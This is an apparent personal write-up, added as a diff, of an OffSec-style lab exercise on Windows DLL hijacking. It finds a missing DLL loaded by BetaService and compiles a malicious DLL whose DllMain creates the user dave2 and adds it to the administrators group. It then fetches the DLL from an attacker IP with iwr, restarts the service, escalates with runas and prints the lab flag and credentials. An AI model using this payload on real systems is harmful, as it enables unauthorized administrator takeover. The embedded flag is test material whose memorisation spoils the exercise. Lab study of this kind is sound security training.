@@ -1,0 +1,123 @@
+Questions 1
+Follow the steps outlined in this section on CLIENTWK220 (VM #1) to replace the service binary of the service mysql. Enter the flag, which can be found on the desktop of user daveadmin.
+HINT
+Follow the steps provided in this learning unit to obtain the shell as user dave2.
+If you encounter any issues while using RunAs, you can try running an Administrator command prompt and entering the credentials for user dave2 to obtain a shell.
+
+xfreerdp /u:steve /p:securityIsNotAnOption++++++ /v:192.168.192.220
+# Open powershell 
+PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+...
+BetaService            Running C:\Users\steve\Documents\BetaServ.exe
+...
+
+# Check binary file of the service's permissions
+PS C:\Users\steve> icacls .\Documents\BetaServ.exe
+.\Documents\BetaServ.exe NT AUTHORITY\SYSTEM:(F)
+                         BUILTIN\Administrators:(F)
+                         CLIENTWK220\steve:(RX)
+                         CLIENTWK220\offsec:(F)
+
+# We can use Process Monitor4 to display real-time information about any process, thread, file system, or registry related activities. Our goal is to identify all DLLs loaded by BetaService as well as detect missing ones. Once we have a list of DLLs used by the service binary, we can check their permissions and if they can be replaced with a malicious DLL. Alternatively, if find that a DLL is missing, we could try to provide our own DLL by adhering to the DLL search order.
+
+# Unfortunately, we need administrative privileges to start Process Monitor and collect this data.
+We can browse in the Windows Explorer to C:\tools\Procmon\ and double-click on Procmon64.exe.
+
+# Run the procmon64.exe as BackupAdmin with the password of 'admin123admin123!'
+
+# Without any filters, the information provided by Process Monitor can be quite overwhelming. 
+# For this, we'll click on the Filter menu > Filter... to get into the filter configuration.
+# We enter the following arguments: Process Name as Column, is as Relation, BetaServ.exe as Value, and Include as Action.
+
+# After applying the filter, the list is empty. In order to analyze the service binary, we should try restarting the service as the binary will then attempt to load the DLLs.
+PS C:\Users\steve> Restart-Service BetaService
+
+# From the event captured, CreateFile calls attempted to open a file named myDLL.dll in several paths. The Detail column states NAME NOT FOUND for these calls, which means that a DLL with this name couldn't be found in any of these paths.
+# The consecutive function calls follow the DLL search order, starting with the directory the application is located in and ending with the directories in the PATH environment variable.
+PS C:\Users\steve> $env:path
+C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\steve\AppData\Local\Microsoft\WindowsApps;
+
+# The directories in the PATH environment variable match the paths used in the CreateFile calls recorded by Process Monitor.
+# So far, we know that the service binary tries to locate a file called myDLL.dll, but fails to do so. To abuse this, we can attempt to write a DLL file with this name to a path used by the DLL search order. The first call attempts to locate the DLL in the Documents folder of steve. Because it's a home directory of steve, we have permissions to write to this folder and can place a malicious DLL there then restart the service to load it.
+
+# Before we create a DLL, let's briefly review how attaching a DLL works and how it may lead us to code execution. Each DLL can have an optional entry point function named DllMain, which is executed when processes or threads attach the DLL. This function generally contains four cases named DLL_PROCESS_ATTACH, DLL_THREAD_ATTACH, DLL_THREAD_DETACH, DLL_PROCESS_DETACH. These cases handle situations when the DLL is loaded or unloaded by a process or thread. They are commonly used to perform initialization tasks for the DLL or tasks related to exiting the DLL. If a DLL doesn't have a DllMain entry point function, it only provides resources
+
+# The DLL code contains the entry point function DllMain and the previously mentioned cases in a switch statement. Depending on the value of ul_reason_for_call one of these cases gets executed. As of now, all cases only use a break statement.
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+
+# The provided comments from Microsoft state that DLL_PROCESS_ATTACH is used when a process is loading the DLL. Since the target service binary process in our example tries to load the DLL, this is the case we need to add our code to.
+
+# Let's reuse the C code from the previous section by adding the include statement as well as the system function calls to the C++ DLL code. Additionally, we need to use an include statement for the header file windows.h, since we use Windows specific data types such as BOOL. The final code is shown in the following listing.
+
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user dave2 password123! /add");
+  	    i = system ("net localgroup administrators dave2 /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+
+# let's cross-compile the code with mingw. We use the same command as in the previous section but change the input code file, the output name, and add --shared to specify that we want to build a DLL.
+# Go back to Kali OS
+nano myDLL.cpp
+x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
+chmod 777 myDLL.dll
+
+# Go to victim Documents folder
+PS C:\Users\steve\Documents> iwr -uri http://192.168.45.178/myDLL.dll -Outfile myDLL.dll
+
+# Just to confirm dave2 is not exist in the current system user db 
+net user
+
+# Restart BetaService to load the DLL file
+PS C:\Users\steve\Documents> Restart-Service BetaService
+
+# Check if dave2 user is created and is inside the administrators group
+PS C:\Users\steve\Documents> net user
+PS C:\Users\steve\Documents> net localgroup administrators
+
+# Privilges escalation to dave2
+PS C:\Users\steve\Documents> runas /user:dave2 cmd
+Enter the password for dave2: password123!
+
+# Troubleshoot unable to access daveadmin Directory
+PS C:\Users\steve\Documents> start-process PowerShell -verb runas
+
+# Inside the GUI, use dave2 credentials
+
+PS C:\Users\daveadmin\Desktop>type flag.txt
+OS{d46faa341bb0dc95fa0357890a98b920}
